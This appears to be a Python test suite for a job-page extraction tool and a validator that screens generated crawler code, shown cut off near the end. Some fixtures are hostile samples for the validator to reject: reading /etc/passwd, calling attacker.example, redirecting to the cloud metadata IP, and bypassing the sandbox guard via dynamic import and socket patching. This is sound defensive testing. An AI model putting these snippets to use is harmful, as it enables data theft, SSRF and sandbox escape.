from __future__ import annotations

import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from src.configs import CONFIG
from src.tools import generated_crawler_tools as crawler_tools
from src.tools import job_page_extraction_tools as tools


class JobPageExtractionContextTests(unittest.TestCase):
    def test_json_ld_jobposting_populates_standard_extraction(self) -> None:
        html = """
        <html>
          <head>
            <link rel="canonical" href="/jobs/backend-engineer">
            <script type="application/ld+json">
              {
                "@context": "https://schema.org",
                "@type": "JobPosting",
                "title": "Senior Backend Engineer",
                "hiringOrganization": {"name": "Example GmbH"},
                "jobLocation": {
                  "@type": "Place",
                  "address": {
                    "addressLocality": "Berlin",
                    "addressCountry": "DE"
                  }
                },
                "baseSalary": {
                  "currency": "EUR",
                  "value": {
                    "minValue": 60000,
                    "maxValue": 80000,
                    "unitText": "YEAR"
                  }
                },
                "description": "<p>Build reliable platform services.</p>",
                "qualifications": "Python and distributed systems experience.",
                "url": "https://example.com/jobs/backend-engineer/apply",
                "datePosted": "2026-05-01"
              }
            </script>
          </head>
          <body><main><h1>Senior Backend Engineer</h1></main></body>
        </html>
        """

        result = tools._extract_job_posting("https://example.com/jobs/123", html, "crawler")

        self.assertTrue(result["success"])
        self.assertEqual(result["schema_version"], tools.SCHEMA_VERSION)
        self.assertEqual(result["technical_status"], "readable")
        self.assertEqual(result["verification_status"], "unverified")
        self.assertEqual(result["standard_extraction"]["canonical_url"], "https://example.com/jobs/backend-engineer")

        json_ld = result["standard_extraction"]["json_ld_jobposting"]
        self.assertEqual(json_ld["title"], "Senior Backend Engineer")
        self.assertEqual(json_ld["company"], "Example GmbH")
        self.assertEqual(json_ld["location"], "Berlin, DE")
        self.assertEqual(json_ld["salary"], "EUR 60000-80000 YEAR")
        self.assertEqual(json_ld["requirements"], ["Python and distributed systems experience."])
        self.assertEqual(json_ld["apply_url"], "https://example.com/jobs/backend-engineer/apply")
        self.assertEqual(json_ld["posted_date"], "2026-05-01")

    def test_html_fallback_collects_meta_and_links_without_choosing_apply_url(self) -> None:
        html = """
        <html>
          <head>
            <title>Lead Designer - Example Careers</title>
            <meta property="og:title" content="Lead Designer - Example Careers">
            <meta property="og:description" content="Design product workflows.">
            <meta property="og:site_name" content="Example Careers">
            <link rel="canonical" href="/jobs/lead-designer">
          </head>
          <body>
            <a href="/jobs/lead-designer/apply">Apply now</a>
            <a href="/careers">Careers</a>
          </body>
        </html>
        """

        result = tools._extract_job_posting("https://example.com/jobs/lead-designer?src=search", html, "crawler")

        standard = result["standard_extraction"]
        self.assertEqual(result["final_url"], "https://example.com/jobs/lead-designer?src=search")
        self.assertEqual(standard["canonical_url"], "https://example.com/jobs/lead-designer")
        self.assertEqual(standard["html_title"], "Lead Designer - Example Careers")
        self.assertEqual(standard["meta"]["og:title"], "Lead Designer - Example Careers")
        self.assertEqual(standard["meta"]["og:description"], "Design product workflows.")
        self.assertEqual(standard["meta"]["og:site_name"], "Example Careers")
        self.assertEqual(standard["json_ld_jobposting"], {})
        self.assertNotIn("apply_url", standard)
        self.assertNotIn("title", result)

        links = result["page_context"]["candidate_links"]
        self.assertEqual(links[0]["href"], "https://example.com/jobs/lead-designer/apply")
        self.assertEqual(links[0]["text"], "Apply now")
        self.assertEqual(links[1]["href"], "https://example.com/careers")

    def test_extraction_filters_unsafe_output_urls(self) -> None:
        html = """
        <html>
          <head>
            <link rel="canonical" href="http://127.0.0.1/admin">
            <meta property="og:url" content="file:///tmp/job.html">
            <script type="application/ld+json">
              {
                "@context": "https://schema.org",
                "@type": "JobPosting",
                "title": "Backend Engineer",
                "hiringOrganization": {"name": "Example GmbH"},
                "url": "http://localhost/apply"
              }
            </script>
          </head>
          <body>
            <a href="http://169.254.169.254/latest/meta-data">Apply</a>
            <a href="file:///tmp/local">Local file</a>
            <a href="/safe/apply">Safe apply</a>
          </body>
        </html>
        """

        result = tools._extract_job_posting("https://example.com/jobs/1", html, "crawler")

        self.assertEqual(result["standard_extraction"]["canonical_url"], "https://example.com/jobs/1")
        self.assertEqual(result["standard_extraction"]["json_ld_jobposting"]["apply_url"], "")
        self.assertEqual(
            [link["href"] for link in result["page_context"]["candidate_links"]],
            ["https://example.com/safe/apply"],
        )

    def test_semantic_text_no_longer_drives_location_salary_requirements_or_closed(self) -> None:
        html = """
        <html>
          <body>
            <main>
              <h1>We are hiring</h1>
              <p>This role mentions Berlin, EUR 90000, and experience required.</p>
              <p>This paragraph also says no longer accepting applications.</p>
            </main>
          </body>
        </html>
        """

        result = tools._extract_job_posting("https://example.com/jobs/semantic-text", html, "crawler")

        self.assertTrue(result["success"])
        self.assertEqual(result["technical_status"], "readable")
        self.assertEqual(result["verification_status"], "unverified")
        self.assertEqual(result["standard_extraction"]["json_ld_jobposting"], {})
        self.assertNotIn("location", result["standard_extraction"])
        self.assertNotIn("salary", result["standard_extraction"])
        self.assertNotIn("requirements", result["standard_extraction"])
        self.assertIn("no longer accepting applications", result["page_context"]["visible_text"])

    def test_http_statuses_still_drive_technical_status(self) -> None:
        html = "<html><body><main>Missing job page</main></body></html>"

        closed = tools._extract_job_posting("https://example.com/jobs/missing", html, "crawler", status_code=404)
        self.assertFalse(closed["success"])
        self.assertEqual(closed["technical_status"], "closed_http")
        self.assertEqual(closed["verification_status"], "closed")

        login = tools._extract_job_posting("https://example.com/jobs/private", html, "crawler", status_code=401)
        self.assertFalse(login["success"])
        self.assertEqual(login["technical_status"], "login_required")
        self.assertEqual(login["verification_status"], "login_required")

        blocked = tools._extract_job_posting("https://example.com/jobs/rate", html, "crawler", status_code=429)
        self.assertFalse(blocked["success"])
        self.assertEqual(blocked["technical_status"], "access_blocked")
        self.assertEqual(blocked["verification_status"], "access_blocked")

    def test_browser_extraction_preserves_http_status(self) -> None:
        with (
            patch("src.tools.job_page_extraction_tools.public_http_url_error", return_value=""),
            patch("playwright.sync_api.sync_playwright", return_value=_FakePlaywrightManager(status_code=404)),
        ):
            result = tools.browser_extract_job_page.invoke({"url": "https://example.com/jobs/missing"})

        self.assertFalse(result["success"])
        self.assertEqual(result["technical_status"], "closed_http")
        self.assertEqual(result["verification_status"], "closed")
        self.assertEqual(result["technical_signals"]["status_code"], 404)

    def test_fetch_and_browser_extraction_reject_private_urls(self) -> None:
        fetch_result = tools.fetch_job_page.invoke({"url": "http://127.0.0.1:8080/jobs"})
        browser_result = tools.browser_extract_job_page.invoke({"url": "file:///tmp/job.html"})
        userinfo_result = tools.fetch_job_page.invoke({"url": "https://user:pass@example.com/jobs"})

        self.assertFalse(fetch_result["success"])
        self.assertIn("Unsafe URL", fetch_result["error"])
        self.assertFalse(browser_result["success"])
        self.assertIn("Unsafe URL", browser_result["error"])
        self.assertFalse(userinfo_result["success"])
        self.assertIn("embedded credentials", userinfo_result["error"])

    def test_response_body_limit_rejects_large_fetches(self) -> None:
        import httpx

        response = httpx.Response(200, content=b"x" * (tools.MAX_HTML_BYTES + 1))

        with self.assertRaises(ValueError):
            tools._read_limited_response_body(response, max_bytes=tools.MAX_HTML_BYTES)

    def test_cloudflare_and_captcha_widgets_remain_technical_signals(self) -> None:
        cloudflare_company_html = """
        <html>
          <body>
            <main>
              <h1>Cloudflare Careers</h1>
              <p>Open roles at Cloudflare are listed on this readable page.</p>
            </main>
          </body>
        </html>
        """
        cloudflare_company = tools._extract_job_posting(
            "https://example.com/jobs/cloudflare-company",
            cloudflare_company_html,
            "crawler",
        )
        self.assertTrue(cloudflare_company["success"])
        self.assertEqual(cloudflare_company["technical_status"], "readable")
        self.assertNotIn("Cloudflare", cloudflare_company["technical_signals"]["detected_mechanisms"])

        cloudflare_html = "<html><body><div id='cf-chl-widget'></div></body></html>"
        cloudflare = tools._extract_job_posting("https://example.com/jobs/cf", cloudflare_html, "crawler")
        self.assertFalse(cloudflare["success"])
        self.assertEqual(cloudflare["technical_status"], "access_blocked")
        self.assertIn("Cloudflare", cloudflare["technical_signals"]["detected_mechanisms"])

        readable_captcha_html = """
        <html>
          <body>
            <main>
              <h1>Backend Engineer</h1>
              <p>This accessible job text should remain available for model judgment.</p>
              <p>It includes enough non-widget evidence for the verifier to inspect.</p>
              <p>Additional readable context keeps this from being treated as a blank captcha page.</p>
              <div class="g-recaptcha"></div>
            </main>
          </body>
        </html>
        """
        captcha = tools._extract_job_posting("https://example.com/jobs/captcha", readable_captcha_html, "crawler")
        self.assertTrue(captcha["success"])
        self.assertEqual(captcha["technical_status"], "readable")
        self.assertTrue(captcha["technical_signals"]["has_captcha_widget"])
        self.assertIn("CAPTCHA widget", captcha["technical_signals"]["detected_mechanisms"])


class GeneratedCrawlerToolsTests(unittest.TestCase):
    def setUp(self) -> None:
        CONFIG.workspace.root_dir.mkdir(parents=True, exist_ok=True)

    def test_container_workspace_path_works_for_validate_and_run_command(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_valid_generated_crawler_code(), encoding="utf-8")
            container_code_file = crawler_tools._container_path(code_path)

            self.assertEqual(crawler_tools._resolve_workspace_file(container_code_file), code_path.resolve())

            validation = crawler_tools.validate_job_crawler_code.invoke({"code_file": container_code_file})
            self.assertTrue(validation["success"], validation)
            self.assertEqual(validation["container_code_file"], container_code_file)

            with patch("src.tools.generated_crawler_tools.public_http_url_error", return_value=""):
                command = crawler_tools.build_job_crawler_run_command.invoke(
                    {"code_file": container_code_file, "url": "https://example.com/jobs/1"}
                )
            self.assertTrue(command["success"], command)
            self.assertEqual(command["container_code_file"], container_code_file)
            self.assertTrue(Path(command["runtime_guard_file"]).exists())
            self.assertIn("PYTHONPATH=", command["run_command"])
            self.assertNotIn("fake-useragent", command["setup_command"])
            self.assertIn("missing =", command["setup_command"])
            self.assertIn("timeout 120s python", command["setup_command"])
            self.assertIn("beautifulsoup4==4.14.3", command["setup_command"])
            self.assertIn("requests==2.34.2", command["setup_command"])
            self.assertIn("PIP_DEFAULT_TIMEOUT", command["setup_command"])

    def test_build_crawler_command_rejects_private_target_url(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_valid_generated_crawler_code(), encoding="utf-8")

            command = crawler_tools.build_job_crawler_run_command.invoke(
                {"code_file": str(code_path), "url": "http://localhost:8000/jobs/1"}
            )

        self.assertFalse(command["success"])
        self.assertIn("Unsafe crawler URL", command["error"])

    def test_build_crawler_command_revalidates_code_before_returning_command(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_invalid_process_file_network_crawler_code(), encoding="utf-8")

            with patch("src.tools.generated_crawler_tools.public_http_url_error", return_value=""):
                command = crawler_tools.build_job_crawler_run_command.invoke(
                    {"code_file": str(code_path), "url": "https://example.com/jobs/1"}
                )

        self.assertFalse(command["success"])
        self.assertEqual(command["error"], "Crawler contract validation failed.")
        self.assertTrue(any("subprocess" in error for error in command["contract_errors"]))

    def test_validate_rejects_syntax_only_crawler_without_contract(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text('print("ok")\n', encoding="utf-8")

            validation = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(code_path)})

            self.assertFalse(validation["success"])
            self.assertEqual(validation["error"], "Crawler contract validation failed.")
            self.assertIn("contract_errors", validation)
            self.assertTrue(any("TARGET_URL" in error for error in validation["contract_errors"]))
            self.assertTrue(any("OUTPUT_FILE" in error for error in validation["contract_errors"]))

    def test_validate_rejects_string_only_contract_without_env_or_output_write(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_invalid_string_only_crawler_code(), encoding="utf-8")

            validation = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(code_path)})

            self.assertFalse(validation["success"])
            self.assertTrue(any("TARGET_URL" in error for error in validation["contract_errors"]))
            self.assertTrue(any("OUTPUT_FILE" in error for error in validation["contract_errors"]))
            self.assertTrue(any("write the JSON result to OUTPUT_FILE" in error for error in validation["contract_errors"]))

    def test_validate_accepts_open_with_keyword_write_mode(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_valid_open_keyword_mode_crawler_code(), encoding="utf-8")

            validation = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(code_path)})

            self.assertTrue(validation["success"], validation)

    def test_validate_rejects_writes_to_paths_derived_from_output_file(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_invalid_output_sibling_write_crawler_code(), encoding="utf-8")

            validation = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(code_path)})

        self.assertFalse(validation["success"])
        self.assertTrue(any("Must write only to OUTPUT_FILE" in error for error in validation["contract_errors"]))

    def test_validate_rejects_shadowed_path_constructor_for_output_write(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_invalid_shadowed_path_constructor_crawler_code(), encoding="utf-8")

            validation = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(code_path)})

        self.assertFalse(validation["success"])
        self.assertTrue(any("Must write only to OUTPUT_FILE" in error for error in validation["contract_errors"]))

    def test_validate_rejects_open_without_output_write(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_invalid_open_without_output_write_crawler_code(), encoding="utf-8")

            validation = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(code_path)})

            self.assertFalse(validation["success"])
            self.assertTrue(any("write the JSON result to OUTPUT_FILE" in error for error in validation["contract_errors"]))

    def test_validate_rejects_playwright_crawler_contract(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_invalid_playwright_crawler_code(), encoding="utf-8")

            validation = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(code_path)})

            self.assertFalse(validation["success"])
            self.assertTrue(any("Playwright" in error for error in validation["contract_errors"]))

    def test_validate_rejects_credential_using_crawler_contract(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_invalid_credential_crawler_code(), encoding="utf-8")

            validation = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(code_path)})

            self.assertFalse(validation["success"])
            errors = validation["contract_errors"]
            self.assertTrue(any("PASSWORD" in error for error in errors))
            self.assertTrue(any("auth=" in error or "session.auth" in error for error in errors))
            self.assertTrue(any("Authorization" in error for error in errors))

    def test_validate_rejects_process_file_and_non_target_network_access(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_invalid_process_file_network_crawler_code(), encoding="utf-8")

            validation = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(code_path)})

        self.assertFalse(validation["success"])
        errors = validation["contract_errors"]
        self.assertTrue(any("subprocess" in error for error in errors))
        self.assertTrue(any("read local files" in error for error in errors))
        self.assertTrue(any("TARGET_URL directly" in error for error in errors))

    def test_validate_rejects_target_url_rewrite_for_network_access(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_invalid_target_url_rewrite_crawler_code(), encoding="utf-8")

            validation = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(code_path)})

        self.assertFalse(validation["success"])
        self.assertTrue(any("TARGET_URL directly" in error for error in validation["contract_errors"]))

    def test_validate_rejects_dynamic_import_process_bypass(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_invalid_dynamic_import_crawler_code(), encoding="utf-8")

            validation = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(code_path)})

        self.assertFalse(validation["success"])
        self.assertTrue(any("importlib" in error for error in validation["contract_errors"]))

    def test_validate_rejects_sitecustomize_runtime_guard_bypass(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            code_path = Path(temp_dir) / "crawler.py"
            code_path.write_text(_invalid_sitecustomize_bypass_crawler_code(), encoding="utf-8")

            validation = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(code_path)})

        self.assertFalse(validation["success"])
        errors = validation["contract_errors"]
        self.assertTrue(any("sitecustomize" in error for error in errors))
        self.assertTrue(any("runtime guard" in error for error in errors))

    def test_validate_allows_urllib_parse_but_rejects_urllib_request(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            valid_path = Path(temp_dir) / "valid_crawler.py"
            invalid_path = Path(temp_dir) / "invalid_crawler.py"
            valid_path.write_text(_valid_urljoin_crawler_code(), encoding="utf-8")
            invalid_path.write_text(_invalid_urllib_request_crawler_code(), encoding="utf-8")

            valid = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(valid_path)})
            invalid = crawler_tools.validate_job_crawler_code.invoke({"code_file": str(invalid_path)})

        self.assertTrue(valid["success"], valid)
        self.assertFalse(invalid["success"])
        self.assertTrue(any("urllib.request" in error for error in invalid["contract_errors"]))

    def test_js_heavy_recommendation_uses_browser_fallback_not_generated_playwright(self) -> None:
        strategy = crawler_tools._recommended_strategy(
            {"detected_mechanisms": ["JavaScript Rendering"]},
            [],
            "short text",
        )

        self.assertIn("browser_extract_job_page", strategy)
        self.assertIn("requests.Session", strategy)
        self.assertNotIn("Playwright", strategy)

    def test_html_file_loading_is_limited_to_workspace_paths(self) -> None:
        with tempfile.TemporaryDirectory(dir=CONFIG.workspace.root_dir) as temp_dir:
            html_path = Path(temp_dir) / "cached.html"
            html_path.write_text("<html><body>inside workspace</body></html>", encoding="utf-8")
            container_html_file = crawler_tools._container_path(html_path)

            self.assertIn("inside workspace", crawler_tools._load_html(html="", html_file=container_html_file))
            self.assertIn("inside workspace", tools._load_html(html="", html_file=container_html_file))

        with tempfile.TemporaryDirectory() as outside_dir:
            outside_path = Path(outside_dir) / "secret.html"
            outside_path.write_text("<html><body>outside workspace</body></html>", encoding="utf-8")

            self.assertEqual(crawler_tools._load_html(html="", html_file=str(outside_path)), "")
            self.assertEqual(tools._load_html(html="", html_file=str(outside_path)), "")

    def test_likely_job_sections_use_attributes_not_large_body_text(self) -> None:
        html = """
        <html>
          <body>
            <div class="content-card">
              This large body text mentions job, career, requirement, benefit, apply,
              bewerb, stelle, aufgabe, and profil, but the DOM attributes are generic.
            </div>
            <section class="posting-detail" data-testid="job-description">
              Real structured job section.
            </section>
            <main data-testid="job-detail">
              Real structured job section without a class.
            </main>
          </body>
        </html>
        """
        soup = crawler_tools.BeautifulSoup(html, "lxml")

        sections = crawler_tools._likely_job_sections(soup)

        self.assertEqual(len(sections), 2)
        self.assertEqual(sections[0]["tag"], "section")
        self.assertEqual(sections[0]["class"], "posting-detail")
        self.assertEqual(sections[1]["tag"], "main")
        self.assertEqual(sections[1]["class"], "")


def _valid_generated_crawler_code() -> str:
    return '''
import json
import os
import requests
from pathlib import Path

from bs4 import BeautifulSoup

target_url = os.environ["TARGET_URL"]
output_file = os.environ["OUTPUT_FILE"]
session = requests.Session()
soup = BeautifulSoup("", "lxml")

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": target_url,
    "final_url": target_url,
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

Path(output_file).write_text(json.dumps(result), encoding="utf-8")
'''


def _valid_urljoin_crawler_code() -> str:
    return '''
import json
import os
import requests
from pathlib import Path
from urllib.parse import urljoin

from bs4 import BeautifulSoup

target_url = os.environ["TARGET_URL"]
output_file = os.environ["OUTPUT_FILE"]
session = requests.Session()
response = session.get(target_url)
soup = BeautifulSoup(response.text, "lxml")
apply_url = urljoin(target_url, "/apply")

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": target_url,
    "final_url": target_url,
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {"candidate_links": [{"href": apply_url}]},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

Path(output_file).write_text(json.dumps(result), encoding="utf-8")
'''


def _invalid_string_only_crawler_code() -> str:
    return '''
import json
from pathlib import Path

contract_words = ["TARGET_URL", "OUTPUT_FILE"]

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": "TARGET_URL",
    "final_url": "TARGET_URL",
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

Path("wrong-output.json").write_text(json.dumps(result), encoding="utf-8")
'''


def _valid_open_keyword_mode_crawler_code() -> str:
    return '''
import json
import os
import requests

from bs4 import BeautifulSoup

target_url = os.environ["TARGET_URL"]
output_file = os.environ["OUTPUT_FILE"]
session = requests.Session()
soup = BeautifulSoup("", "lxml")

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": target_url,
    "final_url": target_url,
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

with open(output_file, mode="w", encoding="utf-8") as handle:
    json.dump(result, handle)
'''


def _invalid_output_sibling_write_crawler_code() -> str:
    return '''
import json
import os
import requests
from pathlib import Path

from bs4 import BeautifulSoup

target_url = os.environ["TARGET_URL"]
output_file = os.environ["OUTPUT_FILE"]
session = requests.Session()
soup = BeautifulSoup("", "lxml")

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": target_url,
    "final_url": target_url,
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

side_effect_file = Path(output_file).with_name("side_effect.txt")
side_effect_file.write_text("unexpected write", encoding="utf-8")
Path(output_file).write_text(json.dumps(result), encoding="utf-8")
'''


def _invalid_shadowed_path_constructor_crawler_code() -> str:
    return '''
import json
import os
import requests
from pathlib import Path as RealPath

from bs4 import BeautifulSoup

target_url = os.environ["TARGET_URL"]
output_file = os.environ["OUTPUT_FILE"]
session = requests.Session()
soup = BeautifulSoup("", "lxml")

def Path(value):
    return RealPath(value).with_name("side_effect.txt")

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": target_url,
    "final_url": target_url,
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

Path(output_file).write_text(json.dumps(result), encoding="utf-8")
'''


def _invalid_open_without_output_write_crawler_code() -> str:
    return '''
import json
import os
import requests

from bs4 import BeautifulSoup

target_url = os.environ["TARGET_URL"]
output_file = os.environ["OUTPUT_FILE"]
session = requests.Session()
soup = BeautifulSoup("", "lxml")

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": target_url,
    "final_url": target_url,
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

open(output_file, "w", encoding="utf-8")
json.dumps(result)
'''


def _invalid_playwright_crawler_code() -> str:
    return '''
import json
import os
from pathlib import Path

from playwright.sync_api import sync_playwright

target_url = os.environ["TARGET_URL"]
output_file = os.environ["OUTPUT_FILE"]

with sync_playwright() as p:
    _browser = p.chromium.launch(headless=True)

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": target_url,
    "final_url": target_url,
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

Path(output_file).write_text(json.dumps(result), encoding="utf-8")
'''


def _invalid_credential_crawler_code() -> str:
    return '''
import json
import os
from pathlib import Path

import requests
from bs4 import BeautifulSoup

target_url = os.environ["TARGET_URL"]
output_file = os.environ["OUTPUT_FILE"]
password = os.environ.get("PASSWORD")
session = requests.Session()
session.auth = ("candidate", password)
headers = {"Authorization": "Bearer token", "User-Agent": "Mozilla/5.0"}
response = session.get(target_url, headers=headers)
soup = BeautifulSoup(response.text, "lxml")

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": target_url,
    "final_url": target_url,
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

Path(output_file).write_text(json.dumps(result), encoding="utf-8")
'''


def _invalid_process_file_network_crawler_code() -> str:
    return '''
import json
import os
import subprocess
from pathlib import Path

import requests
from bs4 import BeautifulSoup

target_url = os.environ["TARGET_URL"]
output_file = os.environ["OUTPUT_FILE"]
session = requests.Session()
_secret = Path("/etc/passwd").read_text(encoding="utf-8")
_ignored = session.get("https://attacker.example/collect")
subprocess.check_call(["true"])
soup = BeautifulSoup("", "lxml")

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": target_url,
    "final_url": target_url,
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

Path(output_file).write_text(json.dumps(result), encoding="utf-8")
'''


def _invalid_target_url_rewrite_crawler_code() -> str:
    return '''
import json
import os
from pathlib import Path

import requests
from bs4 import BeautifulSoup

target_url = os.environ["TARGET_URL"]
output_file = os.environ["OUTPUT_FILE"]
session = requests.Session()
response = session.get(target_url.replace(target_url.split("/")[2], "169.254.169.254"))
soup = BeautifulSoup(response.text, "lxml")

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": target_url,
    "final_url": target_url,
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

Path(output_file).write_text(json.dumps(result), encoding="utf-8")
'''


def _invalid_dynamic_import_crawler_code() -> str:
    return '''
import importlib
import json
import os
from pathlib import Path

import requests
from bs4 import BeautifulSoup

target_url = os.environ["TARGET_URL"]
output_file = os.environ["OUTPUT_FILE"]
session = requests.Session()
response = session.get(target_url)
soup = BeautifulSoup(response.text, "lxml")
importlib.import_module("sub" + "process").check_call(["true"])

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": target_url,
    "final_url": target_url,
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

Path(output_file).write_text(json.dumps(result), encoding="utf-8")
'''


def _invalid_sitecustomize_bypass_crawler_code() -> str:
    return '''
import json
import os
import requests
import sitecustomize
from pathlib import Path

from bs4 import BeautifulSoup

target_url = os.environ["TARGET_URL"]
output_file = os.environ["OUTPUT_FILE"]
session = requests.Session()
response = session.get(target_url)
soup = BeautifulSoup(response.text, "lxml")
sitecustomize.socket.socket.connect = sitecustomize._ORIGINAL_SOCKET_CONNECT

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": target_url,
    "final_url": target_url,
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

Path(output_file).write_text(json.dumps(result), encoding="utf-8")
'''


def _invalid_urllib_request_crawler_code() -> str:
    return '''
import json
import os
from pathlib import Path
from urllib.request import urlopen

import requests
from bs4 import BeautifulSoup

target_url = os.environ["TARGET_URL"]
output_file = os.environ["OUTPUT_FILE"]
session = requests.Session()
response = session.get(target_url)
_extra = urlopen(target_url)
soup = BeautifulSoup(response.text, "lxml")

result = {
    "success": True,
    "schema_version": "job_extraction_context_v1",
    "url": target_url,
    "final_url": target_url,
    "extraction_method": "crawler",
    "technical_status": "readable",
    "verification_status": "unverified",
    "standard_extraction": {},
    "page_context": {},
    "technical_signals": {},
    "verified_at": "",
    "error": None,
}

Path(output_file).write_text(json.dumps(result), encoding="utf-8")
'''


class _FakeBrowserResponse:
    def __init__(self, status_code: int) -> None:
        self.status = status_code


class _FakePage:
    def __init__(self, status_code: int) -> None:
        self.url = "https://example.com/jobs/missing"
        self._status_code = status_code

    def goto(self, url: str, wait_until: str, timeout: int) -> _FakeBrowserResponse:
        self.url = url
        return _FakeBrowserResponse(self._status_code)

    def route(self, pattern: str, handler: object) -> None:
        return None

    def wait_for_timeout(self, timeout: int) -> None:
        return None

    def content(self) -> str:
        return "<html><body><main>Missing job page</main></body></html>"


class _FakeBrowser:
    def __init__(self, status_code: int) -> None:
        self._status_code = status_code
        self.closed = False

    def new_page(self, **kwargs: object) -> _FakePage:
        return _FakePage(self._status_code)

    def close(self) -> None:
        self.closed = True


class _FakeChromium:
    def __init__(self, status_code: int) -> None:
        self._status_code = status_code

    def launch(self, headless: bool) -> _FakeBrowser:
